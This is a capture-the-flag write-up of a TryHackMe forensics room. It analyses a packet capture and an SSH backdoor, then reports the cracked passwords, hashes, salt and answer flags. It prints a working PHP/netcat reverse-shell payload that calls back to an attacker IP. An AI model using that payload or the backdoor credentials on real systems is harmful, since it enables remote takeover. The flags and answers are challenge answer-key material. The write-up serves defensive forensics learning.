# Overpass2- Hacked Challenge Report
## Introduction
This challenge involves analysis and investigation of a network traffic dump from a compromised network. The goal is to analyse the network traffic and identify how the attacker got into the network and check for any persistence mechanisms. After that, we have to hack our way back into the machine to get the flags. It also involves password cracking and some malware reverse engineering.

Let’s get going...

## Walkthrough
## Task 1: Forensics- Analyse the PCAP
**Question:** What was the URL of the page they used to upload a reverse shell? <br>
**Answer:** /development/ <br>

To view uploaded data we use thefollowing filter in wireshark **http.request.method=POST** <br>
<img width="953" height="354" alt="task 1 1" src="https://github.com/user-attachments/assets/45184ebb-c109-4842-8c23-8c8ad532ed17" /> <br>
_URL used to upload the reverse the shell_

A **reverse shell** is a remote access method/script where a compromised target machine initiates an outbound network connection back to an attacker's listening machine/C2 Server. The reverse shell can help the analyst identify the attacker's C2 server which can help in blocking their IP for remote access.

Question: What payload did the attacker use to gain access? <br>
Answer: **<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh-i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>** <br>

<img width="709" height="177" alt="task 1 2" src="https://github.com/user-attachments/assets/f30ba1dd-6a7c-478c-8c1d-37bf8a35a7d1" /> <br>
_Reverse shell payload used by attacker_

Let's try and understand what the script does before proceeding with the investigation:
- It is PHP script is a reverse shell payload that forces a compromised Linux server to bypass firewalls by initiating an outbound network connection back to an attacker's machine at 192.168.170.145 on port 4242.
- It uses the exec() function to create a temporary named pipe (/tmp/f), which acts as a two-way communication bridge on the system.
- The script then launches an interactive Unix command shell (/bin/sh -i), binds it to the network using Netcat (nc), and routes the attacker's remote inputs directly into the server's command terminal—granting them complete, interactive control over the host.

Question: What password did the attacker use to privesc? <br>
Answer: **whenevernoteartinstant**

To get the answer, we filter for http traffic using the filter `http` and analyze the filtered results. Attackers are notorius for using unencrypted protocols such as http and ftp. Filtering for this in a traffic dump can easily tell the analyst the actions of the attacker. <br>
<img width="1152" height="253" alt="task 1 3" src="https://github.com/user-attachments/assets/d3fd3520-ca2e-4d8a-b202-77b0d6a08ae8" /> <br>
_Password used by attacker for privilege escalation_

Question: How did the attacker establish persistence? <br>
Answer: **https://github.com/NinjaJc01/ssh-backdoor** <br>
<img width="1171" height="87" alt="task 1 4" src="https://github.com/user-attachments/assets/02b6fa5b-684f-491b-a90a-01cf92daf599" /> <br>
_Backdoor used by attacker for persistence_

Question: Using the fasttrack wordlist, how many of the system passwords were crackable? <br>
Answer: **4**

## Task 2: Research- Analyse the code
Let us visit the GitHub link https://github.com/NinjaJc01/ssh-backdoor discovered previously for analysis/reverse engineering. Reverse engineering is the process of deconstructing and analyzing a malicious file—whether a compiled binary, an obfuscated script, or a document macro—to uncover its hidden logic, functionality, and intent without access to the original source code.

We can proceed and analyse the backdoor from Github. This will act as our sandbox for static analysis. 
<br>

**Question:** What's the default hash for the backdoor? <br>
**Answer**: bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3 <br>
<img width="1881" height="897" alt="task 2 1" src="https://github.com/user-attachments/assets/bbb89866-e9b5-4044-bace-900d37e02e73" />

_Default hash for the backdoor_

Giving a keen look at main.go file, we are able to discover the default hash of the backdoor stored under the variable `hash` of string type. 

Question: What's the hardcoded salt for the backdoor?
Answer: **1c362db832f3f864c8c2fe05f2002a05**

Maybe before answering this question we should look at what a salt is in the context of encryption. A salt is a random string of unique data added to a plaintext password before it is run through a cryptographic hashing function.

<img width="1589" height="945" alt="task 2 2" src="https://github.com/user-attachments/assets/35ecdc48-711a-4f1a-a166-41d5b920b447" />

_Hard coded salt for the backdoor_

Analysing the same file from previous question we discover thee `passwordHandler` function which acts as a secret gatekeeper for this backdoor script, completely bypassing the server's normal login security. When someone/attacker tries to connect, it takes their typed password, combines it with the hardcoded text string (**1c362db832f3f864c8c2fe05f2002a05**), and scrambles it using SHA-512 encryption. If that scrambled result matches the 128-character master key at the top of the script—which happens if they type the secret word "password"—it grants immediate access. Once let inside, the script automatically hands control over to the sshterminal section, which immediately spawns a powerful, interactive Linux terminal (`/bin/bash`) directly inside the attacker's window.

Question: What was the hash that the attacker used?- go back to the
PCAP for this!
Answer: **6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed**
<img width="1344" height="724" alt="task 2 3" src="https://github.com/user-attachments/assets/b5d5b3e4-cb9e-4252-a167-3e8980e0f0bf" />

_Hash used by the attacker_

Going back to the pcap file and following the TCP stream, we come across activity showing how the attacker configures the backdoor including generating rsa keys, giving the backdoor execution privileges and passing their own hash. Backdoor serves as persistence mechanisms for attackers.

Question: Crack the hash using rockyou and a cracking tool of your choice. What's the password? <br>
Answer: **november16**

## Task 3: Attack- Get back in
Question: The attacker defaced the website. What message did they leave as a heading? <br>
Answer: **H4ck3d by CooctusClan** <br>
<img width="1462" height="276" alt="task 3 1" src="https://github.com/user-attachments/assets/4481abd8-41cc-4e21-84c3-7290883a6dbb" /> <br>
_Defaced website_

Question: Using the information you've found previously, hack your way back in! <br>
Answer: **No answer needed.**

Question: What's the user flag? <br>
Answer: **thm{d119b4fa8c497ddb0525f7ad200e6567}** <br>
<img width="800" height="77" alt="task 3 3" src="https://github.com/user-attachments/assets/f23ae5c8-55d7-4ff2-bf6c-f652e72bc96f" /> <br>
_User flag_

Question: What's the root flag? <br>
Answer: **thm{d53b2684f169360bb9606c333873144d}** <br>
<img width="451" height="74" alt="task 3 4 " src="https://github.com/user-attachments/assets/8a419f40-d3aa-4073-a769-3c8d83f13316" /> <br>
_Root flag_

## Module completion
TryHackMe Profile Link: https://tryhackme.com/p/kl45h
_Did this module and completed a while ago_

## Conclusion
Learned a couple of new things. One, analyzing malware and network for IOCs collection which can be used for defense in IDS/IPS systems. Two cracking password hashes with JohnTheRipper and hashcat.

This was a good learning experience as this knowledge can be used during Digital Forensics and Incident Response.
